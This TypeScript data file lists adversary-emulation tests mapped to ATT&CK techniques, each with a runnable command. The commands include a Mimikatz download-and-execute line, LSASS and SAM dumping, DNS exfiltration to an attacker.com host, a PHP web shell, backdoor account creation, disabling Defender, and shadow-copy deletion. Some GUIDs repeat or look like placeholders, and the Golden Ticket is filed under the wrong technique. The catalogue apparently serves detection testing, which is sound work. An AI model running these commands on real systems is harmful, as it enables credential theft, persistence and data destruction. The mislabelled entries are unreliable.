export interface ArtTest {
  technique_id: string;
  test_guid: string;
  name: string;
  description: string;
  platform: string;
  executor_type: string;
  auto_generated_command: string;
}

export const ART_TESTS: ArtTest[] = [
  // T1059 - Command and Scripting Interpreter
  { technique_id: 'T1059.001', test_guid: 'f3132740-1591-4b42-a040-5c6d746540fd', name: 'Mimikatz - PowerShell', description: 'Execute Mimikatz via PowerShell', platform: 'windows', executor_type: 'powershell', auto_generated_command: 'IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds' },
  { technique_id: 'T1059.001', test_guid: '0d41f19a-9b5e-4c3a-98ea-57e8e64cf8fc', name: 'PowerShell Encoded Command', description: 'Run an encoded PowerShell command to evade detection', platform: 'windows', executor_type: 'powershell', auto_generated_command: 'powershell -EncodedCommand dwBoAG8AYQBtAGkA' },
  { technique_id: 'T1059.003', test_guid: '4bafb9f2-8bf8-4f36-9e1e-4ba0f0c4d4c1', name: 'Cmd.exe Execute Command', description: 'Execute a command via cmd.exe', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: 'cmd.exe /c whoami' },
  { technique_id: 'T1059.004', test_guid: 'a980763a-2000-4d02-b93a-2568cf76ee0c', name: 'Bash Command Execution', description: 'Execute commands through bash shell', platform: 'linux,macos', executor_type: 'bash', auto_generated_command: 'bash -c "id; uname -a; cat /etc/passwd"' },
  { technique_id: 'T1059.006', test_guid: '3a9e6e08-1c86-4c87-9e40-99e4f82cd3e2', name: 'Python Execute OS Commands', description: 'Use Python to execute system commands', platform: 'linux,macos,windows', executor_type: 'python', auto_generated_command: 'python3 -c "import os; os.system(\'id\')"' },
  // T1053 - Scheduled Task/Job
  { technique_id: 'T1053.005', test_guid: 'af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd', name: 'Scheduled Task Startup Script', description: 'Create a scheduled task that runs at system startup', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: 'schtasks /create /tn "AtomicTask" /tr "cmd.exe /c whoami > C:\\Users\\Public\\whoami.txt" /sc onstart /ru SYSTEM' },
  { technique_id: 'T1053.003', test_guid: '2e69e9e0-0bba-4987-8e2a-4a3e96780a9a', name: 'Cron Job', description: 'Create a cron job for persistence', platform: 'linux,macos', executor_type: 'bash', auto_generated_command: 'echo "* * * * * /tmp/atomic.sh" | crontab -' },
  // T1003 - OS Credential Dumping
  { technique_id: 'T1003.001', test_guid: 'c6bc55e9-b41c-4028-8c3e-a5c1a37c8dd4', name: 'Dump LSASS Process', description: 'Dump LSASS process memory using comsvcs.dll', platform: 'windows', executor_type: 'powershell', auto_generated_command: 'rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Windows\\Temp\\lsass.dmp full' },
  { technique_id: 'T1003.002', test_guid: 'fbde438d-f5e7-48b0-8c5c-9aafd0d0c6dc', name: 'Security Account Manager (SAM)', description: 'Copy SAM and SYSTEM registry hives', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: 'reg save HKLM\\sam C:\\Users\\Public\\sam.hive && reg save HKLM\\system C:\\Users\\Public\\system.hive' },
  { technique_id: 'T1003.007', test_guid: 'a1f0e9d0-5e7f-4f4c-91f4-8acb88a78a26', name: '/etc/passwd and /etc/shadow', description: 'Read /etc/shadow to obtain credential hashes', platform: 'linux', executor_type: 'bash', auto_generated_command: 'cat /etc/shadow' },
  // T1055 - Process Injection
  { technique_id: 'T1055.001', test_guid: 'b8db96c5-bd28-4f4c-8aef-8e91b9b3b8c4', name: 'Process Injection via DLL Injection', description: 'Inject a DLL into a running process', platform: 'windows', executor_type: 'powershell', auto_generated_command: '$bytes = [System.IO.File]::ReadAllBytes("C:\\payload.dll"); $handle = [Kernel32]::OpenProcess(0x1F0FFF, $false, (Get-Process notepad).Id)' },
  { technique_id: 'T1055.012', test_guid: 'b42a4d0d-2f48-4f9e-b3c0-6b97cde6c3e5', name: 'Process Hollowing', description: 'Hollow out a process and inject malicious code', platform: 'windows', executor_type: 'powershell', auto_generated_command: 'Start-Process -FilePath "C:\\Windows\\System32\\svchost.exe" -Suspended' },
  // T1110 - Brute Force
  { technique_id: 'T1110.001', test_guid: 'b6c5f580-b3f4-4de3-9a41-e8e9b9ce0d86', name: 'Password Spraying', description: 'Attempt common passwords against multiple accounts', platform: 'windows', executor_type: 'powershell', auto_generated_command: '$users = @("user1","user2","user3"); foreach($u in $users) { net use \\\\127.0.0.1\\IPC$ /user:$u "Password1" 2>$null }' },
  { technique_id: 'T1110.003', test_guid: '9e85a90e-3f7b-4e81-ab5b-5f20e8d5d432', name: 'Password Spray via SSH', description: 'Spray passwords against SSH service', platform: 'linux,macos', executor_type: 'bash', auto_generated_command: 'for user in root admin test; do sshpass -p "Password1" ssh -o StrictHostKeyChecking=no $user@127.0.0.1 2>/dev/null && echo "Success: $user"; done' },
  // T1021 - Remote Services
  { technique_id: 'T1021.001', test_guid: 'a28c0ddd-7f7e-462c-9c97-3a7ec6a51d3e', name: 'RDP Session', description: 'Establish an RDP session to a remote host', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: 'mstsc /v:192.168.1.1 /admin' },
  { technique_id: 'T1021.004', test_guid: 'ee24001e-a75c-4ec6-b84d-1c3d0e15c8e5', name: 'SSH Remote Command Execution', description: 'Execute remote commands via SSH', platform: 'linux,macos', executor_type: 'bash', auto_generated_command: 'ssh -o StrictHostKeyChecking=no user@192.168.1.1 "id; uname -a"' },
  // T1046 - Network Service Discovery
  { technique_id: 'T1046', test_guid: 'f7e17eb3-e8e8-4a54-b5c1-1e5c5bfbfa40', name: 'Port Scan with nmap', description: 'Perform network port scan to discover services', platform: 'linux,macos', executor_type: 'bash', auto_generated_command: 'nmap -sV -p 22,80,443,445,3389 192.168.1.0/24' },
  { technique_id: 'T1046', test_guid: 'a6d2b5b9-c6d9-4be0-a5c1-a5e42b02b5d8', name: 'Port Scan PowerShell', description: 'PowerShell TCP port scanner', platform: 'windows', executor_type: 'powershell', auto_generated_command: '1..1024 | ForEach-Object { $sock = New-Object System.Net.Sockets.TcpClient; $async = $sock.BeginConnect("192.168.1.1", $_, $null, $null); Start-Sleep -Milliseconds 50; if ($sock.Connected) { $_ }; $sock.Close() }' },
  // T1071 - Application Layer Protocol
  { technique_id: 'T1071.001', test_guid: 'b6a2e3d4-5b4e-4c85-8b8c-7e7f8e9f7a53', name: 'HTTPS C2 Beacon', description: 'Simulate HTTPS-based C2 communication', platform: 'linux,macos', executor_type: 'bash', auto_generated_command: 'curl -s -X POST https://httpbin.org/post -H "User-Agent: Mozilla/5.0" -d "data=beacon"' },
  { technique_id: 'T1071.004', test_guid: 'c3e4f5a6-b7d8-4e9f-a0b1-c2d3e4f5a6b7', name: 'DNS C2 via TXT Records', description: 'Use DNS TXT record lookups for C2 communication', platform: 'linux,macos,windows', executor_type: 'bash', auto_generated_command: 'dig TXT @8.8.8.8 google.com +short' },
  // T1547 - Boot or Logon Autostart Execution
  { technique_id: 'T1547.001', test_guid: 'a8b9c0d1-e2f3-4a5b-6c7d-8e9f0a1b2c3d', name: 'Registry Run Key Persistence', description: 'Add malware to registry run key for persistence', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: 'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "AtomicTest" /t REG_SZ /d "C:\\Users\\Public\\payload.exe" /f' },
  { technique_id: 'T1547.004', test_guid: 'b2c3d4e5-f6a7-4b8c-9d0e-1f2a3b4c5d6e', name: 'Winlogon Helper DLL', description: 'Set malicious DLL as Winlogon helper', platform: 'windows', executor_type: 'powershell', auto_generated_command: 'Set-ItemProperty "HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -Name "Userinit" -Value "C:\\windows\\system32\\userinit.exe,C:\\Users\\Public\\evil.dll"' },
  // T1036 - Masquerading
  { technique_id: 'T1036.003', test_guid: 'c3d4e5f6-a7b8-4c9d-0e1f-2a3b4c5d6e7f', name: 'Rename System Utilities', description: 'Rename a system executable to hide malicious activity', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: 'copy C:\\Windows\\System32\\cmd.exe C:\\Users\\Public\\svchost.exe && C:\\Users\\Public\\svchost.exe /c whoami' },
  { technique_id: 'T1036.005', test_guid: 'd4e5f6a7-b8c9-4d0e-1f2a-3b4c5d6e7f8a', name: 'Match Legitimate Name or Location', description: 'Place malware in legitimate system path', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: 'copy C:\\Users\\Public\\payload.exe C:\\Windows\\System32\\update.exe' },
  // T1070 - Indicator Removal
  { technique_id: 'T1070.001', test_guid: 'e5f6a7b8-c9d0-4e1f-2a3b-4c5d6e7f8a9b', name: 'Clear Windows Event Logs', description: 'Clear Windows event logs to remove forensic artifacts', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: 'wevtutil el | foreach {wevtutil cl "$_"}' },
  { technique_id: 'T1070.003', test_guid: 'f6a7b8c9-d0e1-4f2a-3b4c-5d6e7f8a9b0c', name: 'Clear Bash History', description: 'Clear bash command history to remove evidence', platform: 'linux,macos', executor_type: 'bash', auto_generated_command: 'cat /dev/null > ~/.bash_history && history -c' },
  // T1562 - Impair Defenses
  { technique_id: 'T1562.001', test_guid: 'a7b8c9d0-e1f2-4a3b-4c5d-6e7f8a9b0c1d', name: 'Disable Windows Defender', description: 'Disable Windows Defender to impair defenses', platform: 'windows', executor_type: 'powershell', auto_generated_command: 'Set-MpPreference -DisableRealtimeMonitoring $true' },
  { technique_id: 'T1562.004', test_guid: 'b8c9d0e1-f2a3-4b4c-5d6e-7f8a9b0c1d2e', name: 'Disable Firewall via netsh', description: 'Disable Windows Firewall using netsh command', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: 'netsh advfirewall set allprofiles state off' },
  // T1048 - Exfiltration Over Alternative Protocol
  { technique_id: 'T1048.003', test_guid: 'c9d0e1f2-a3b4-4c5d-6e7f-8a9b0c1d2e3f', name: 'DNS Exfiltration', description: 'Exfiltrate data encoded in DNS queries', platform: 'linux,macos', executor_type: 'bash', auto_generated_command: 'data=$(cat /etc/hostname | base64); dig @8.8.8.8 ${data:0:63}.exfil.attacker.com' },
  // T1078 - Valid Accounts
  { technique_id: 'T1078.002', test_guid: 'd0e1f2a3-b4c5-4d6e-7f8a-9b0c1d2e3f4a', name: 'Create Local Admin Account', description: 'Create a new local administrator account', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: 'net user AtomicTestUser Password1! /add && net localgroup administrators AtomicTestUser /add' },
  { technique_id: 'T1078.004', test_guid: 'e1f2a3b4-c5d6-4e7f-8a9b-0c1d2e3f4a5b', name: 'Create Cloud Account', description: 'Create unauthorized cloud IAM user', platform: 'iaas:aws', executor_type: 'sh', auto_generated_command: 'aws iam create-user --user-name AtomicTestUser && aws iam attach-user-policy --user-name AtomicTestUser --policy-arn arn:aws:iam::aws:policy/AdministratorAccess' },
  // T1486 - Data Encrypted for Impact
  { technique_id: 'T1486', test_guid: 'f2a3b4c5-d6e7-4f8a-9b0c-1d2e3f4a5b6c', name: 'Encrypt Files (Simulated Ransomware)', description: 'Encrypt files in a test directory to simulate ransomware behavior', platform: 'linux,macos', executor_type: 'bash', auto_generated_command: 'mkdir -p /tmp/atomic_test && echo "test" > /tmp/atomic_test/test.txt && openssl enc -aes-256-cbc -salt -in /tmp/atomic_test/test.txt -out /tmp/atomic_test/test.enc -k "atomicred"' },
  // T1190 - Exploit Public-Facing Application
  { technique_id: 'T1190', test_guid: 'a3b4c5d6-e7f8-4a9b-0c1d-2e3f4a5b6c7d', name: 'SQL Injection (DVWA)', description: 'Exploit SQL injection in a vulnerable web application', platform: 'linux', executor_type: 'bash', auto_generated_command: 'curl -s "http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+1%3D1--&Submit=Submit" -b "security=low"' },
  // T1560 - Archive Collected Data
  { technique_id: 'T1560.001', test_guid: 'b4c5d6e7-f8a9-4b0c-1d2e-3f4a5b6c7d8e', name: 'Archive Data with 7-Zip', description: 'Archive sensitive files using 7-Zip before exfiltration', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: '"C:\\Program Files\\7-Zip\\7z.exe" a -tzip -p"atomicred" C:\\Users\\Public\\archive.zip C:\\Users\\*\\Documents\\*' },
  { technique_id: 'T1560.001', test_guid: 'c5d6e7f8-a9b0-4c1d-2e3f-4a5b6c7d8e9f', name: 'Archive Data with tar', description: 'Create tar archive of collected data', platform: 'linux,macos', executor_type: 'bash', auto_generated_command: 'tar -czf /tmp/collected.tar.gz /etc/passwd /etc/shadow 2>/dev/null' },
  // T1566 - Phishing
  { technique_id: 'T1566.001', test_guid: 'd6e7f8a9-b0c1-4d2e-3f4a-5b6c7d8e9f0a', name: 'Spearphishing Attachment (Macro)', description: 'Simulate opening a phishing document with malicious macros', platform: 'windows', executor_type: 'powershell', auto_generated_command: 'Start-Process WINWORD.EXE C:\\Users\\Public\\malicious.doc' },
  // T1543 - Create or Modify System Process
  { technique_id: 'T1543.003', test_guid: 'e7f8a9b0-c1d2-4e3f-4a5b-6c7d8e9f0a1b', name: 'Create Windows Service', description: 'Create a malicious Windows service for persistence', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: 'sc create AtomicService binpath= "C:\\Users\\Public\\payload.exe" start= auto && sc start AtomicService' },
  // T1134 - Access Token Manipulation
  { technique_id: 'T1134.001', test_guid: 'f8a9b0c1-d2e3-4f4a-5b6c-7d8e9f0a1b2c', name: 'Token Impersonation', description: 'Steal and impersonate a process token', platform: 'windows', executor_type: 'powershell', auto_generated_command: 'Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\\SYSTEM"' },
  // T1087 - Account Discovery
  { technique_id: 'T1087.001', test_guid: 'a9b0c1d2-e3f4-4a5b-6c7d-8e9f0a1b2c3d', name: 'Enumerate Local Users', description: 'List all local user accounts', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: 'net user && wmic useraccount list full' },
  { technique_id: 'T1087.002', test_guid: 'b0c1d2e3-f4a5-4b6c-7d8e-9f0a1b2c3d4e', name: 'Enumerate Domain Users', description: 'List all domain users via net command', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: 'net user /domain && net group "Domain Admins" /domain' },
  // T1027 - Obfuscated Files or Information
  { technique_id: 'T1027', test_guid: 'c1d2e3f4-a5b6-4c7d-8e9f-0a1b2c3d4e5f', name: 'Encode Payload with Base64', description: 'Encode a payload in base64 to evade detection', platform: 'linux,macos', executor_type: 'bash', auto_generated_command: 'echo "malicious_payload" | base64 | bash -c "$(base64 -d)"' },
  // T1218 - System Binary Proxy Execution
  { technique_id: 'T1218.011', test_guid: 'd2e3f4a5-b6c7-4d8e-9f0a-1b2c3d4e5f6a', name: 'Rundll32 Execute DLL', description: 'Use rundll32 to execute a malicious DLL', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(\'atomic\')' },
  { technique_id: 'T1218.005', test_guid: 'e3f4a5b6-c7d8-4e9f-0a1b-2c3d4e5f6a7b', name: 'Mshta Execute Inline VBScript', description: 'Use mshta.exe to execute malicious script', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd.exe /c whoami > C:\\Users\\Public\\whoami.txt"":close")' },
  // T1505 - Server Software Component
  { technique_id: 'T1505.003', test_guid: 'f4a5b6c7-d8e9-4f0a-1b2c-3d4e5f6a7b8c', name: 'Web Shell Deployment', description: 'Deploy a web shell for persistent access', platform: 'linux', executor_type: 'bash', auto_generated_command: 'echo "<?php system($_GET[\'cmd\']); ?>" > /var/www/html/shell.php' },
  // T1572 - Protocol Tunneling
  { technique_id: 'T1572', test_guid: 'a5b6c7d8-e9f0-4a1b-2c3d-4e5f6a7b8c9d', name: 'SSH Port Forwarding', description: 'Use SSH tunneling to bypass network controls', platform: 'linux,macos', executor_type: 'bash', auto_generated_command: 'ssh -N -L 8080:internal-host:80 user@jump-server &' },
  // T1136 - Create Account
  { technique_id: 'T1136.001', test_guid: 'b6c7d8e9-f0a1-4b2c-3d4e-5f6a7b8c9d0e', name: 'Create Local Account', description: 'Create a backdoor local user account', platform: 'linux', executor_type: 'bash', auto_generated_command: 'useradd -m -s /bin/bash backdooruser && echo "backdooruser:Password1!" | chpasswd' },
  // T1083 - File and Directory Discovery
  { technique_id: 'T1083', test_guid: 'c7d8e9f0-a1b2-4c3d-4e5f-6a7b8c9d0e1f', name: 'File and Directory Discovery - Linux', description: 'Search for sensitive files on Linux systems', platform: 'linux,macos', executor_type: 'bash', auto_generated_command: 'find / -name "*.pem" -o -name "*.key" -o -name "id_rsa" 2>/dev/null | head -20' },
  // T1098 - Account Manipulation
  { technique_id: 'T1098', test_guid: 'd8e9f0a1-b2c3-4d4e-5f6a-7b8c9d0e1f2a', name: 'Add Account to Privileged Group', description: 'Add a user account to privileged group', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: 'net localgroup administrators /add domain\\targetuser' },
  // T1057 - Process Discovery
  { technique_id: 'T1057', test_guid: 'e9f0a1b2-c3d4-4e5f-6a7b-8c9d0e1f2a3b', name: 'Process Discovery - Windows', description: 'Enumerate running processes', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: 'tasklist /v && wmic process list full' },
  // T1018 - Remote System Discovery
  { technique_id: 'T1018', test_guid: 'f0a1b2c3-d4e5-4f6a-7b8c-9d0e1f2a3b4c', name: 'Remote System Discovery - ARP', description: 'Use ARP to discover remote systems', platform: 'windows,linux', executor_type: 'command_prompt', auto_generated_command: 'arp -a' },
  // T1041 - Exfiltration Over C2 Channel
  { technique_id: 'T1041', test_guid: 'a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d', name: 'Exfil Data via HTTPS POST', description: 'Exfiltrate collected data via HTTPS POST request', platform: 'linux,macos', executor_type: 'bash', auto_generated_command: 'curl -s -X POST https://httpbin.org/post -F "file=@/etc/hostname"' },
  // T1569 - System Services
  { technique_id: 'T1569.002', test_guid: 'b2c3d4e5-f6a7-4b8c-9d0e-1f2a3b4c5d6e', name: 'Service Execution via sc.exe', description: 'Use sc.exe to start a service for execution', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: 'sc start "Windows Update"' },
  // T1490 - Inhibit System Recovery
  { technique_id: 'T1490', test_guid: 'c3d4e5f6-a7b8-4c9d-0e1f-2a3b4c5d6e7f', name: 'Delete Volume Shadow Copies', description: 'Delete shadow copies to prevent system recovery', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: 'vssadmin delete shadows /all /quiet' },
  // T1489 - Service Stop
  { technique_id: 'T1489', test_guid: 'd4e5f6a7-b8c9-4d0e-1f2a-3b4c5d6e7f8a', name: 'Stop Security Service', description: 'Stop security-related Windows services', platform: 'windows', executor_type: 'command_prompt', auto_generated_command: 'net stop "Windows Defender Antivirus Service" /y' },
  // T1530 - Data from Cloud Storage
  { technique_id: 'T1530', test_guid: 'e5f6a7b8-c9d0-4e1f-2a3b-4c5d6e7f8a9b', name: 'List S3 Bucket Contents', description: 'Enumerate and download files from an S3 bucket', platform: 'iaas:aws', executor_type: 'sh', auto_generated_command: 'aws s3 ls s3://target-bucket --recursive && aws s3 sync s3://target-bucket /tmp/exfil/' },
  // T1606 - Forge Web Credentials
  { technique_id: 'T1606.002', test_guid: 'f6a7b8c9-d0e1-4f2a-3b4c-5d6e7f8a9b0c', name: 'Golden Ticket Attack', description: 'Create a Kerberos Golden Ticket for persistent domain access', platform: 'windows', executor_type: 'powershell', auto_generated_command: 'Invoke-Mimikatz -Command "kerberos::golden /domain:lab.local /sid:S-1-5-21-000 /rc4:aabbccdd /user:krbtgt /id:500 /ptt"' },
];
